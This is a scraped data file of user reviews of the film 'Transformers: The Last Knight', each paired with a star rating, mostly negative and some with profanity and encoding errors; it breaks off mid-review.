"This fifth Transformers movie was the worst of them all. Mark Wahlberg, Anthony Hopkins, Josh Duhamel, Tyrese Gibson, and the rest of the cast did a decent job in this movie. The plot to the movie was pretty tedious and dull. The movie wasn't as thrilling as the previous four movies. In my opinion, the cast and crew tried too hard to make this movie great and failed in the process. If you haven't seen this movie yet, don't waste your time. It's not worth seeing.",2
Some of it is bad but it's good,5
"The movie is a lit long, and with too many symbolic messages. Too over. Go back to those transforming characters with action styles may be better.",2
Honestly this movie isn't bad the cgi is good and the whole plot of main guy being evil but this plot when down the drain the story isn't good what do u expect from Micheal Bay this kinda ruins the first movie for me but hey I still enjoyed this movie,3.5
I'm not even sure what is going on in this movie but geez was it the worst transformers ever. Bumblebee gets his voice back and automatically snaps Optimus out of this trance. Reminded me of Superman and Batman with the whole Martha thing.,1
"i got a headache from this movie, even revenge of the fallen was better.",0.5
"Talk about an absolute mess. There's not much redeeming about this. The story is bloated, there are too many characters, things don't make sense, and it's kind of boring.",1
"Transformers The Last Knight, I have waited a couple of years to watch due to the negative reviews but I must have watched another movie cause I loved it ! a fun ride with spectacular special effects , great story and my favorite Transformers movie the critics must just not understand the story or must just hate Michael Bay and anything he does , Michael Bay has down an amazing job with the 5th installment of the Transformers franchise. I have two words for this movie ABSOLUTELY AMAZING and one word for the reviewers disappointments I am so ""disappointed"" with your reviews but the movie is excellent to me.",5
"Transformers: The Last Knight It is a movie full of multiple absurd plots, a totally illogical script, a story that is not convincing, a rhythm that is either too fast or too slow. A bad closing for the films directed by Michael Bay.",2
"Es un poco m√°s de lo mismo , lo que no se discute don los efectos es un espect√°culo... Hay sabe gastar en efectos , Mark Wahlberg bien. Estar√≠a bueno que para la pr√≥xima lo metan Labeouf",4
"I think the low overall rating is a bit harsh. The special effects are pretty awesome and overall the film was reasonably enjoyable. I guess its faults are: The whole Merlin storyline is rubbish, the Megan Fox look-a-like is a bit too obvious (nothing wrong with her acting mind you) and some of the script is incredibly wooden. I also had a huge dislike to the US Army being the enemy and chasing the hero's of the film. Its also a long film. Seemed to reasonably quickly, but it's long.",3
I liked it a lot too the story is good and the new Transformers hoping to see another Transformers movie.,5
"This movie is terrible. Like I couldn't believe how stupid and dumb this movie is. Now mind you I don't watch these movies for the story or the plot however, this plot is absurd. The action isn't all that great with all the jump cuts and editing. Optimus Prime is barely in the movie. That little girl who had her own trailer is barely in this movie. This movie sucks. Do not waste your time. I'm glad this is the last Michael Bay transformers movie because even though I can watch them and enjoy the action they aren't all that great. The first one is the best one and that one has issues but this movie is awful.",1.5
"Virtually unwatchable... Not enough action, weird, incongruent styles/storylines (heavy dialogue renaissance type story, military mission, the human/transformer relationships, & random transformers standing in the background). I can't even tell if there is insufficient story and they just put a whole bunch of visuals to distract from that... or if they just tried to cover way too much story ideas and were unsuccessful at all(?). Pushed thru the 2+ hours to see if there was a payoff. THere was a bit of action, but not worth all the investment.",2
"So. . .you combine all of the old British myths with the story of the Transformers. Really? At least it is an interesting origins story. It has the obligatory car chases, slow-mo fire fights and attractive people showing off what they got. Other than that, there is not much else.",2
I thought that the story was interesting. The 3rd act is one of my favorites from the Transformers movie series,3.5
"If you love eating tuna and icecream, I doubt you'll enjoy a bowl mixing both!",0.5
"Slightly better than ""Extinction"", but still, it was a pain to sit through. I'll rather have diarrhea than watch this train wreck ever again!",0.5
The movie was really bad. NEVER MIX ROBOTS THAT TURN INTO VEHICLES WITH ARTHURIAN LEGENDS! The two redeeming features of this movie are Anthony Hopkins' character and Cogman. Any science buff would agree that the physics in this movie are trash.,1.5
"A disappointing sequel with worse acting and dialogue than ever before, action scenes than are not as impressive as before, and bizarre narrative choices that prove this franchise should have ended a long time ago.",1
"TF5 is just so bad, boring, loud, long and everything you'd not want to watch in a summer blockbuster.",1
"Let's be real, Transformers: The Last Knight is a disappointment to the entire franchise. This movie is way worse that Revenge of the Fallen. The movie has lazy story, weak characters, and lack of development. The visual and sound effects were the only good things about this movie. Overall, The Last Knight was a doomed idea from the start.",1.5
I like to pretend that this and the 4th movie don‚Äôt exist,0.5
"Action to action sequences, that happen fast.",2.5
I didn't think a Transformer movie could be this bad. It was like watching multiple unorganized movies at one time. For it to have such a high budget and A list actors this was a shock. Don't waste your time watching it.,1
"At best this film is an art house experiment with explosions; dynamic and kinetic, it's Hideo Kojima and Christopher Nolan on acid with a crack-cocaine chaser. It's got a genuinely superb, bonkers but weirdly poetic opening with shots and editing that suggest to me that the formula of these movies, distilled and refined over time has more to offer than just new font and new toy designs. It's got Undead Robot Skeleton Knights, it's got a comedy montage where Megatron brokers a deal to release his gonzo robot henchman from human incarceration, it's got Laura Haddock basically playing Lara Croft, it's got a gunfight at Stonehenge, it's got some of the best cinematography, and high-budget fantasy/science fiction visuals ever displayed, it leans full-tilt into it's fantasy. I unashamedly love this movie, and I don't know why, maybe it's the best of a bad bunch and getting the goofiness and character-less robots and homophobia and uncomfortable female performers, and endless desserts and shoehorned romances, and loud screaming sidekicks out of the way, has allowed for a half-decent film about robots kicking ass over Europe. Is the plot utter shit, yes. Is it a complete an utter blast in ever frame in every regard? Yes. Except maybe the aspect ratios, those shifts are inexplicable and ugly, although the IMAX shots are staggering. Which brings me to the 3D which is THE BEST hands down that I've ever seen at home. It's staggeringly good, the image quality with non-active-shutter is sublime and the 3D both in in front and behind the window effects are second-to-none. It's a real shame when you watch a film like this, to acknowledge that the home video experience of 3D has died a death, because a film like this has stars added to it for the love, care, attention, and quality put into this experience. Bay exits the franchise (possibly) after directing his absolute best Transformers film.",3
Cade suddenly is this special person who was meant to save the world?? Really??,2
"If you love the bay transformers, this is a movie for you. but for a classics G1 fan like myself. this movie is horrible, the plot is terrible and it's very hard to follow along to... the bay films have flaws, and alot of them. the women are mainly used for sexy shots, they are an insult to the g1 cartoon, and the plot and jokes are horrible.",1
My 5th favorite Transformers movie,3.5
"Although it was visually impressive, it was far too long and the plot was ridiculous. I am starting to understand why these newly styled Transformers are lame.",3
Once again a very fun and exciting transformers movie that is best enjoyed on Blu-ray with surround sound for all of its awesome scenes especially the fight of bumblebee and Optimus prime would watch for good fun witch I can say for all the transformers movies,4
"This movie makes no sence, the pacing is all messed up, the story is extremely last-luster, and it basically put all it's budget on otherwise really good looking CGI. Yes, i'm here for the action between Autobots and Decepticons but I'm not gonna neglect the story and the dialouge! As a whole ""pentilogy"" of films from 2007 to 2017, they are all bad, Michael Bay should just stop directing movies, because no matter what, they'll be bad.",1
This movie was ok. It was not what I thought it was going to be.,3
"As a fan of this series, and growing up with it, I have come to love this franchise. This movie gets a bad rap for being too rushed and long at the same time. However, this is a fun ride if you've seen the other instalments and enjoyed them. This is a good finish to this universe of Transformers (if you ignore the end credits), and is quite a fun ride. The reason this isn't a fu;; five stars is because the middle gets slow and you almost forget it's a Transformers movie. Mark Wahlberg and his chemistry with Laura Haddock keeps this section interesting. Overall, this is a fun addition (and now finale) to the main continuity of Transformers films.",4.5
"This movie was extremely long and felt like 10 movies mixed into one, making this Micheal Bay movie a failure. Bay's usual awkward humor and pointless explosions were expected, but the absence of Optimus Prime throughout the first act was a major unexpected blunder. However, the CGI in this movie is at it's best along with the action sequences.",2.5
Que alguien le esconda la coca al Bay por favor...y que alguien llame a guionistas de verdad! Dios...,1.5
"As a long time apologist of Michael Bay's Transformers franchise, I was shocked how abundantly awful this movie was. Honestly, why was this movie even made? There was no reason after Age of Extinction to make another. It starts off with King Arthur, then for some reason we have these kids involved and must team up with the Transformers. The acting is Razzie level, the action sequences can't save it, the massive exposition scenes drove me insane (in between countless yawns). As I watched this movie, I kept saying the same thing over and over. Where was Optimus Prime? Why was this...you know what...I'm ending this review because this is the worst one of the franchise.",0.5
"All over the place , plot too difficult to engage with, that's my experience as an adult , I can see this being entertaining for children.",2
Jesus H f*ck! This movie starts off being decent but then goes down the hill after 20 Min! This film makes Age of Extinction and Revenge of the fallen looks like citizen kane!,1.5
"Here we go again, NO NO and NO!",0.5
"It took me 2 years to watch it and i will always regret watching it. Surprisingly, The Last Knight is a even bigger piece of crap. This franchise died on the first movie. Why did they think it was a good idea to make a 5th one.",1
"3 hours of disappointment. most of the entertaining scenes can be seen in all Transformers 5 trailer, the rest is stuffed with prolonged human plot, forced comedy, WWII nazis, and tons of advertisement which is more than the total transformation throughout the movie. The Last Knight not only has no connection with the previous Transformers trilogy, it also has no connection throughout the movie itself. As usual, Michael Bay and his screenwriters decided to add in cliche jokes and a lot of explosions. and somehow the explosions doesn't cause any damage to anyone. As Optimus Prime drifting in space, he probably infected with some amnesia virus, which makes him forgot Cybertron was destroyed during the Chicago War. But TF5 needs an antagonist that Prime can blame on destroying his planet, that's why Quintessa made a Cybertron replica and ready to slap Prime in the face. You are probably thinking: as a Prime, leader of the Autobots and Mr. Leader of Free Galaxy, he will go through immense pain and suffering to get his brain twisted and turned evil, what we get is Quintessa giving a good hard slap on Prime's face and giving some low level brainwashing speech, VOILA! Nemesis Prime is here! Galvatron seems to regain his full consciousness and turn back as Megatron, but there's no back story about how he get his name and classic transformation style back (Michael Bay is stepping up his guessing game in this movie and we have to reason up what is actually happening throughout this movie). He looks like the leader of gangster more than leader of the Decepticons, and his crew members are filled with racial stereotypes and amusing crime records(bank robbery? really?). and why would Megatron chose Mohawk over Berserker? he's supposed to rule the Earth, not just doing some street crimes! but all of these bullsh*t seems to be reasonable in Bay's TF movies, as all the Autobots, who saved Earth from Decepticons and other threats get brutally shut down by the government. However, the Decepticons who destroyed half of the United States and killed millions, gets to live in comfy, hi-tech prison, have the right to negotiate with the government, get some street tattoos and gold chains, and rob a frickin bank. Zero character development, most of the character was unnecessary(or not supposed to add into movie), I was expecting Isabela Moner to actually represent the strength and reliability in this movie like Laura in Logan. What we get was Greta Thunberg ripoff, shouting for no reason, opposite of helpful and try hard to be intelligent and reliable(and of course, it didn't work out). As the movie goes on, we get to know unnecessary information such as Hound doesn't have a father, Vivian is a well developed female with zero experience about love(wtf), and her mom and aunts keep nagging about when will she get married, Hot Rod wasting time to pronounce his name with his French accent, TRANSFORMERS KILLED HITLER? and other fuckery awaits. The idea of getting the staff to take over the world is oddly similar to Night at the Museum 2. After the Iacon Knights guarded the ignition chamber for 1600 years, their eyes must be covered with rust so they can't see and kill a human properly. as an ancient robot race with various choices of high tech weapon: turn into a massive metal skeleton with rusty swords as weapons (still looks cooler than Que and Mohawk). He's back, he's alive, Nemesis Prime is here to chop some knights! after Nemesis Prime had gone rogue, we finally have some decent fight scene to watch! Nah, it lasts shorter than the time used by Hot Rod pronouncing his name. What did Bumblebee do to break Quintessa's curse? The voice of friendship, of course! as the movie was about to end in 30 minutes, so all the Decepticons have to die in 10 minutes, and 30 seconds for Infernocus, at least Infernocus has a quick death, unlike Megatron has to get kill, decapitate and revive throughout the TF movie franchise. After Quintessa get shot in the spine and disappear, the movie has finally come to an end, where Optimus Prime giving inspirational speech, human and robot hugging each other, and watch the sunset until the credits roll. And nope, this is not the end, Unicron and Quintessa probably going to fight in the next Bayverse TF movie and the entire human race are going to hate Transformers even more. Michael Bay should cast Gerard Butler for the next TF move (If there is another) so he has proper reason to save United States every time and slap an American flag on the audience's face for every minute. I pay to watch a Transformers movie, what I got was a bad parody made by some weird Youtube channel(with tons of ad placements) with insulting story line. The CGI model of Transformers was good tho.",1
I got lost 15 minutes into the movie. Didn't understand what was happening except for catching notice of the scene changes and watching people and robots with bad designs fight over a staff in a time space of + 2 hours or so. This movie is so bad that I don't know why I watched it in the first place.,0.5

"I enjoyed this movie. It was big, action packed, and non-stop. A very big spectacle. Anthony Hopkins committed to the role and didn‚Äôt just deliver a half hearted performance to lend his name to the credits. Some of the silliness that were in prior entries in this franchise were minimized, seemingly cognitively. The plot was absurd but concise and while there were some holes, it wasn‚Äôt a huge distraction. I think going into this, you have to remind yourself that it‚Äôs a Transformers movie directed by Michael Bay. Don‚Äôt take yourself so seriously and go have some fun.",3.5
"Standard Michael Bay: slo-mo, swirling cameras, helicopter shots, obnoxious product placement. Standard Transformers sequel: incoherent action, incoherent plot, waaay long, needlessly complicated. One bright spot: Anthony Hopkins is a hoot.",2

Disappointment and waste of time.,1.5
I hate this movie and it is a disgust to it's franchise,0.5
I could barely stand 40 minutes of this flick and I had to quit. It was just downright boring and silly. Special effects cannot save a bad movie. I just streamed some more intelligent sci-fi of another free movie on Amazon Prime. Not surprised the critics panned this flop. Wished I had my 40 minutes back . . .,1
Transformers The Last Knight in my opinion had some crazy potential but was killed but awful writing. This entire story just sucked but the concept of the Decepticons plan could have been huge. This entire franchise needs a major rejuvenation and breath of fresh air.,1.5
"Garbage, not worth writing anything else.",1
"A giant mess. Easily the worst film Michael Bay has ever done. There is nothing enjoyable about this overlong toy commercial. Garbage CGI, bland characters, terrible acting, no story, no memorable scenes. 2 hours and 35 minutes of my life that I'll never get back. Please avoid this movie at all costs.",1
"With the first four movies as bad as they are it at least felt like they were trying to make a good movie. Trying and failing, but trying nonetheless. This movie however it doesn't even feel like they are trying. I went into this movie thinking it possibly couldn't be any worse than Transformers 4 but Michael Bay never seems to disappoint. 1/10",0.5
Amazing CGI as usual but the plot seems like it is made up as the movie progresses.,2.5

So many wtf moments. The editing really is distracting once you realise the aspect ratio keeps changing sometimes from shot to shot. So many plot points dont really make sense and the jokes are often cringey.,2
"I watched this abomination of a film in theaters. I had zero expectations for it, and it still managed to let me down. Nothing in this film works.

Couldn't finish the movie because it was so horrible.",1

"The money spent on making this over bloated, confused monstrosity could have been used to build a hospital. Or save the rhino. Either option would have been infinitely better.",1
Bumblebee saved this rudderless noisy franchise where Michael Bay thinks he is appealing to audiences with lots of explosions horrid sexual politics and just more and more noise with actors looking lost or In the case of Anthony Hopkins producing more ham than a large bacon sandwich. If you want a headache then this is the film for you. Me I hope the template of Bumblebee will be followed.,0.5

"If you thought Transformers 2-4 were gutter trash that could only appeal to the lowest common denominator then you haven't seen anything yet Transformers: The Last Knight is a film so horrendously bad that only the most simple minded could derive any enjoyment from it. This is basically 2 hours and 35 minutes of random moving images incoherently sewn together in a completely non-sensical way. The basic plot (which is incredibly basic) is easy to follow but all the hour and half of padding is just completely random and illogical and filled with 'jokes' that only Michael Bay and a 3 year old could possibly find amusing. This feels like it was written by an small child that just wanted to throw a load of flashy (and dull) action sequences together but had no idea how to tie everything together. It really is a mess. It isn't even a film that's so bad it's funny, it's just plain awful and a candidate for the title of the worst film ever made. A film this bad should see Michael Bay blacklisted from Hollywood forever. Sadly it won't although the commercial bomb that this was, this will hopefully be the final Transformers film that Hollywood's biggest man child is allowed anywhere near.",0.5
"This movie is horrible. It destroys the transformers franchise, it has a very bad plot. the movie tried to add new things to the franchise, but it fails terribly, it also doesn't feel like a transformers movie, even worse that age of extinction, the only good thing is CCG and Megatron's design, this is just a mess of a movie. the trailers showed a different movie but at last is just a very popcorn movie to see only one time",2
"By far, the worst in the franchise. Even people that I know who are fans of the live action movie series hate this. This is Todd Frazier swinging and missing at the ball in the next zip code bad. Sure was the easiest pass I ever made, though I had to see for myself when it came out for home release cause I'm a sucker for pain.",1

Where did they go? -Optimus/Nemesis Prime had very little screentime. -No clear explanation as to how Megatron reverted Galvatron. -The little girl could've been so good but she was W A S T E D. -Inconsistencies GALORE. Eg: Bumblebee's voice, the history of the Transformers. Verdict: This is the WORST Transformers film BY FAR.",2

Greatest transformers movie ever awesome action and amazing act,5
"I love Transformers movies. Maybe this one is not the best one. But the history of Transformers is awesome. Good ending for the Bayverse, But I wish they can do the six one. 4/5",4
The worst movie ever.,0.5
I loved it regardless of storyline,5
"This is the only transformers movie I didn't like, or at least enjoyed. It had the worst action in the franchise, it was very cringy at points and so many of the human characters were unneeded. The opening scene could have been awesome, but thanks to bay's use of fireworks for explosions, that took away. Also, I thought Optimus was going to be the villain. Not only was he barely a villain, but he was barely in the movie at ALL. It made his screen time in ROTF feel like his screen time in AOE. I give it one star for the visuals and score (those were good).",1
"Sadly this movie is total shyt. It had an irrelevant black dude, a pointless hispanic girl, a slew of the staple lackluster white cast that had no real point or impact on a terrible storyline. It‚Äôs as if the cast was filled out to try an make it a ethnically diversified picture but only succeeded in checking a box. The only one I felt pity for was Sir Anthony Hopkins who had to have his career slighted by this crapfest of a production.",0.5
"""The bigger they are, the harder they fall"". Never has this statement been so accurate than with the fifth installment of Bay's Transformers franchise. From a convoluted and contradicting plot that in an attempt to set-up further films, ruins the one's before it, to amateur and jarring editing by this films one hundred editors, The Last Knight is the anti-thesis of the original Transformers trilogy Bay conjured up-It truly is action without heart. The only redeemable factor of this film is its score, as usual by Steve Jablonsky lives up to expectation. Even Optimus Prime can't save this one from Extinction.",1.5
"This one deserves a 0. It's just so bad, boring, loud, long and everything you'd not want to watch in a summer blockbuster.",0.5
"Pretty much all the criticisms that I had for the last film applies to this film. It's overlong, convoluted, and worst of all, BORING! It's still better than Age of Extinction and Revenge of the Fallen, but that's hardly a compliment. It doesn't try as hard as either of the movies to be funny, but like every other Michael Bay movie, there were bad attempts at humour and shitty one-liners. There were some nice use of slow-mo shots and this makes it easier to follow the action. There were only two good scenes in the entire film. The car chase scene in London and the fight scene between Bumblebee and Optimus Prime. Speaking of Optimus Prime, he's barely in the film. In this 2 and a half hour movie (which is pretty typical for a Transformers movie), I would say that Optimus Prime had a total of 15 minutes of screentime. He's essentially The Joker from Suicide Squad. A lot of fans have defended the limited screentime that The Joker had in Suicide Squad because he's a supporting character, but Optimus Prime has always been an important character in the franchise. Why did we need John Turturro, the black guy, and the bad child actor more than Optimus Prime? I've never been a Transformers fan, but Optimus Prime has always been the best part about the franchise. And like every other Transformers movie, there's a very long and boring third act action set-piece followed by a monologue from Optimus Prime to end the film. Even when you're starting to enjoy the action, it's ruined by not only bad jokes, but constant changes of aspect ratio. Usually, a big budget movie would film entire scenes (usually important scenes) in IMAX before reverting to its original aspect ratio to make the transition as unobtrusive as possible. But the way Bay uses IMAX, the aspect ratio changes in the same scene with each cut, some of which aren't even a second long. Even shot reverse shot changes aspect ratio. It's distracting and pretty hard to ignore. The same visual mess can be seen in Revenge of the Fallen. It's as if Michael Bay is completely talentless. I know people enjoy the Transformers movies for the junk food that it is and would ridicule me for expecting decent writing. I've given that up since Revenge of the Fallen. For the past four films, I've tried to enjoy Transformers as a mindless action flick, but Michael Bay has been doing the same thing for all of these films. It's really not too much to ask for more substance when Logan, Wonder Woman, and Guardians of the Galaxy 2 offers much more than mindless visuals and loud explosions. Even Fast & Furious 8 does mindless action way better than Transformers. It's a one star for the two good scenes in the entire film.",1

F*CKING MICHAEL BAY!!!!!,1
"About what is expected from a bogged series, The Last Knight is just another Michael Bay film. And what is interesting about the Witwicky motto is when one considers its irony. Michael Bay never seizes to sacrifice his ways of making Transformers films. That, perhaps, is why they're generally so terrible.",1.5

I don√Ø¬ø 1/2 1/2(TM)t see anything majorly wrong with this film. We were treated to a extroadinary and fantastic storyline.

I don't know if this Movie is like any of the others, but it's got to be one of the worst movies I've ever seen. Can someone please explain what happens in this movie, because I have no idea. Thankfully, I watched this on Amazon Prime, so I could just stop watching right in the middle. I had better ways to spend my time. This movie looks kind of cool. That's the only positive thing. It would be a great screensaver.",1

"(34/100) Transformers: The Last Knight exceeds its predecessors! In being the worst, I mean. This has got to be one of the worst movies I've watched. The movie has no plot, at least no plot that is interesting or keeps you invested. The plot is only there to serve the action, just like any other Transformers movie, but it is so blatant in this one. To Michael Bay: Just give up, the guy is using 3 different aspect ratios in the same movie and changes between them within one scene 10 times, or something close to that, what's useful about this? It was like Michael Bay wasn't even trying anymore, and it shows. Overall, just the worst movie of 2017 that I've watched and the worst one out of the franchise so far, thank god Bumblebee (2018) saved the franchise.",1.5
Worst. Took my son to see it we both hated it,0.5
Great Movie. I really enjoyed ther Last Knight part,5
While it is definitely not the best movie to come out in 2017 I very much enjoyed watching transformers the last knight.I feel like critics are being too harsh on the movie.there were so many epic scenes to enjoy.My favourite being the part where Cade Yeager literally takes a sword and blocks a transformer swinging a sword.Many epic scenes hidden throughout the film are a testament to Micheal Baes ability as a director to craft scenes of epic proportions that will literally make your skin crawl with goosebumps.Now in my book any movie that gives you goosebumps is a movie done right. Despite all this there are some critisicms that can be made about the movie.However I am not going to touch on that since almost everybody has made the drawbacks of this movie very clear and have in fact gone out of their way to highlight them. I However believe that despite the movie being far from perfect the great things about this movie far outweigh the bad things about it.,4
Interesting and exciting. Effects are awesome and the story is so great. Love it.,5
Not very realistic and logical that it is so easy to say that the movie is terrible,1
"AGGRESSIVELY terrible. Only a good movie if you've never seen any other movies ever made. Humor almost always fell flat except for when Anthony Hopkins was on screen. Story, shot to shot continuity, and some vfx are insultingly awful. Any scene where CGI and people interact sucks you right out of the world. One scene comes to mind when I think how bad the CGI is in this movie; theres a scene where one Transformer is in one shot, then they cut to a wide angle and the VFX team didn't even bother putting the CGI in. It was a plastic mold and no body. Audiences aren't blind anymore. I'm glad this series is dead. Only gave it a half star because no stars wasn't accepted.",0.5
"Exactly what I expect from a transformers! plenty of fighting robots and I actually enjoyed the strory. Was a bit of fun, good watching if you want to switch off and veg out",4
pretty slow film but dont worry at the end it beckmes the fastest trasformer film! and also brings a chance for characters like unicron and primus and quintessa in the sequel but they might reboot which will be dissapointing.,5
every transformers film have something special like tf2 had combiner tf3 had shockwave tf4 dinobots tf5 unicron and i really do hope tf7 dont get cancelled.,5
I did not hate this movie but it was a huge disapointment AND THE WORST TRANSFORMERS FILM EVER. The movie was about Mark Wahlberg not the evil Optimus who we rarely saw as evil and this movie focused more on humans than the transformers. And the decepticons aside from Megatron were all horrible and killed off in minutes. It is very good that Travis Knight saved this series with the bumblebee movie.,2
i liked it the action scenes and cgi was done great,5
"Featuring a Dan Brown-esque plot and deliberate homages to both Ridley Scott and Roland Emmerich, this is definitely the weirdest of these movies. At times ""The Last Knight"" almost feels like it could work,again the plot is bananas and Bay seems to have abandoned some of his worst impulses but ultimately he just doesn't put the work in to make something that could have been enjoyable. And that is what makes this franchise such an oddity. There are five movies that are entirely the vision of a single auteur who just never cared.",2
this one is closest to the g1 to be honest 5 stars,5
"Transformers the last knight is nothing new but it‚Äôs fun. I was never bored I was loving the action and there characters aren‚Äôt half bad. Mark Walhberg is good as Cade Yeager and Anthony Hopkins is also good, he‚Äôs funny and his butler Cogman is awesome, also the little girl is really good but the script and plot are terrible but this is a mixed bag for me. I‚Äôm gonna give transformers the last knight a (B) but from a critic prospective a (C-)",3
i loved optimus prime vs bumblebee and also megatron vs optimus prime it was short 30 second battle but it was beautiful cant wait to see unicron rising and fighting primus critics dont understand unicron and also some transformers fans can they be called fans they havent even seen g1 transformers thats crazy,5
Even worse than Age of Extinction... Rating: 1.6/10,1.5
loved it megatron looking close to g1 look,5

"Transformers: The Last Knight is a tired, cluttered, and unfocused instalment in the series, going through the motions with little narrative drive, and in its search for a fresh plot tramples all over the Transformers mythology. Fortunately, it's not as mean-spirited as some of the previous films, it doesn't end with yet another city getting trashed, and it's given a different flavour by the English locations, a sociopathic robot butler, some of the best special effects yet, a twinkly-eyed Anthony Hopkins, and, um, Merlin.",3
Worst transformer movie,2
"Compared to previous Transformers movies, This one is kind 'better'. confusing/complex storyline, resurrections [the franchise]. The only thing I liked about this one was the upper atmosphere fight scene",3

Hands down the worst movie of the franchise and the most bland and idiotic of all of them.,1
"This movie was fucking terrible, watched it for the first and only time the other day. Why is Ghidorah flying around in a movie about Transformers, its not a damn dinosaur its a freaking Japanese Kaiju. Story was terrible, Optimus Prime just instantly snapped out of his trance, fallen sucked and why don't they ever quickly kill optimus instead of toying with him.",1
I didn‚Äôt think this franchise could get any worse. I was wrong.,0.5
"I usually like movies that turn a good guy bad, but this is one of the worst. The beginning was historically inaccurate, the characters showed almost no character growth, and the movie was an all out war.",1
"This film was the worst of the franchise. The aspect ratios change so much that it is distracting thing, some characters changed from the previous film and others are introduced out of nowhere. There is also a sequel set-up yet it doesn't make any sense. The one thing I can say is that Anthony Hopkins knows what kind of film he's in and his butler makes this film bearable.",1
It was pretty bad tbh.,1.5
"After watching the movie I thought Anthony Hopkins played a wonderful part, I was entertained and it made me think of just the scale this movie spanned with warships, and entire fleets of jets, alot of effort went into making such a movie, I always have had a heart for movies that take history with a sense of imagination, the notion that sometimes the history we are told isnt always the history that could have taken place intrigue me, It was artistic, and creative.",5
"After watching, I would who keeps giving Michael Bay money to continue this franchise, because I'm pretty sure those people are fucking idiots.",1
"Overall it wasn't the best of the franchise. The Editing was very fast and hard to keep out, but everything was blast. I loved the Secret History. Can't wait for the Sequel Hook. Sad to see Michael Bay leave. He has such a talent for such fast paced action.",5
Long and confusing plot. Just watch it for the special effects and you're good.,3
nemisis prime was great why is megatron strong then they got crap decepticons which they are not helping him,5
this is amazing cybertron sucessfully connecting with earth unicron and plenty of action nemisis prime what else do you want!,5
This was the worst movie that has ever been made.,0.5
"It should be obvious, to the one person who probably follows my reviews on RottenTomatoes (since I haven't reviewed a film in this franchise on Letterboxd yet), that I've never been a big fan of the Transformers franchise. I'll be honest, I thought the first movie (at the time) was solid popcorn entertainment. But that was still before we were bombarded, figuratively and literally, by these movies. Summer blockbusters have always been about casual, popcorn entertainment, but I do think that there weren't many movies, at the time, like the original Transformers. So, in a way, you could say it stood out and, again, at the time, it was an entertaining movie. With that said and, now, four sequels later (three of which I've seen), I don't know if I could go back and say that the original was a good movie, if I were to watch it again. But, yes, for all intents and purposes, I enjoyed the original movie at the time. 2009 marked the release of the second film in the franchise, Transformers: Revenge of the Fallen. Revenge of the Fallen, in my opinion, has been one of the worst movies I've ever seen in an actual movie theater. I absolutely loathed that movie. It got one star one RT because the special effects were still excellent. If it wasn't for that, I'd have gladly gone half a star, that's how bad Revenge of the Fallen is. It was so bad that I decided to give myself a break and completely skip the the third installment, Dark of the Moon, entirely. I haven't gone back to watch that movie and I likely never will. What would be the point??? Enough time has passed between when I saw Revenge of the Fallen (almost TEN years ago) that Dark of the Moon, as a continuation, would make absolutely no sense to me. Though, if I am honest, it's not like you'll be able to make much sense of this even if you DO follow this franchise's narrative closely. At least that of the ""original"" trilogy. Honestly, I don't know why I came back to the franchise with Age of Extinction. But I suppose the fact that it was a 'new' start with a new cast of (human) characters and it wasn't so tied to the original trilogy. I knew that much was not gonna change as long as Michael Bay was still leading the franchise. And, as much of an improvement Age of Extinction was over, it was still a bad movie. This brings us to The Last Knight which is, hopefully, the last time Michael Bay will ever make us suffer through one of these again. Ok, so, first things first. I know how it's gonna look, giving this film the score I did when I gave xXx: The Return of Xander Cage a positive rating and review. Firstly, at the very least, while there are flaws with its narrative, xXx is fairly cohesive from beginning to end. You know what the goal is for Vin Diesel and his team at all times. Secondly, I liked the cast and the characters ended up growing on you. Thirdly, Donnie Yen. That's all I got. Seriously though, xXx: Return of Xander Cage was definitely silly, but it was fun, for the most part. The Last Knight, on the other hand, is the same type of overwrought, overstuffed and bloated nonsense that you've seen for eleven years now. Not even an astrophysicist could understand even a third of what's going on here, much less decipher any meaning or purpose. Perhaps that's a bit of an exaggeration, but I am not lying when I tell you had trouble discerning anything about the story. I know that Cybertron is on a collision course with earth in order to heal itself. Cybertron healing itself will lead to millions of deaths on earth. That much is fine, it's everything in between that gets you from point A to point B that is so largely terrible. There's something about Merlin's staff that only a direct descendants of his can wield, there's this talisman that attaches itself to Cade for, really, no real reason other than when it's absolutely convenient for the movie to use it, there's this street urchin that is introduced for, again, no reason whatsoever and serves no actual tangible purpose in the narrative of the movie other than to give Cade someone to care for, there's generic military dudes doing generic military things, there's this engineer (played by Tony Hale) who's trying to warn the suits that there's imminent danger here. This character was never given a name, he's just referred to as a JPL engineer in the X-Ray for this on Prime Video. Two-time Emmy Award Winner Tony fuckin' Hale can't even get a name for his character, that's how inconsequential he is. Oh, Optimus Prime is turned evil by his creator. Cade and Vivian, naturally, develop a romance because of course they do, despite not having anything in common or, really, even knowing each other. Megatron comes back and never has he been less effective than he has been in this movie. For SOME reason John Turturro's character returns here, except he's in Cuba, there is this sociopathic transformer Butler that is, actually, the best character in this franchise's history, playing off a cranky Anthony Hopkins. Hopkins and this butler, Cogman, are the best parts of this movie. I was legitimately entertained by the two. Regardless, the point is to make you see how there's so much shit in this movie. Honestly, I wouldn't be surprised if I missed a couple of things. I don't take notes for movies, that's just not how I do things, so I may have missed more than a few things. But, again, there's no rhyme or reason to anything that's happening. The film does not let you think in the slightest. Everything is an attack on your sight and your ears. This might be one of the loudest movies I've ever seen. This is, obviously, by design, given that if they throw all this shit at you, you won't bother to think about how bad the script actually is at putting together a cohesive and satisfying narrative. And, I know what you're gonna say, that nobody who's a fan of this franchise comes to it for a story. Fine, that's fair, but then what is the point? Why is everything happening??? If they made the effort to, at the very least, tell a coherent narrative with a clear beginning, middle and end with no bullshit, maybe they wouldn't hate this fucking franchise so much. As it stands, it's like the script was purposely put together out of order and filmed this way. Like they just grabbed pages at random and that was the way the script was structured. Because nothing really flows from one scene to the next. It's all justifying the next major set piece. The thing is, though, that the only thing taking them to the next set piece is, umm, a set piece. There's dialogue in between these set pieces, but never have I ever paid less attention at dialogue in a Transformer movie as I did with this one. Well, unless it was involving Burton (Hopkins' character) and Cogman, that was the only time I paid any attention. The humans, naturally, are uninteresting so, of course, they focus more on them than on the fucking giant alien robots that transform into vehicles and other objects. I wonder if there's a transformer vibrator. That's a story I could get into. Things happen and you don't even remember them five minutes later. How many of you forgot that Burton died and Cogman, after honoring his 'master', was never seen again??? Come on now, be honest. It has to be in the high 60s, maybe even in the 70s. Nothing has any weight. The film can't have a poignant moment between, literally, the only two characters I've enjoyed in this franchise, because they're worried that the death might not have enough explosions. I mean, it's a Michael Bay movie, so why Burton couldn't have spontaneously blown up is beyond me. Nothing makes sense in this universe, why should death? Izabella, after being introduced, also disappears into the ether and, again, her character (who could have been cool) amounts to next to nothing, because she serves no real purpose in the long run. Optimus Prime is, really, quite a non-factor in the movie. He's turned by Quintessa into Nemesis 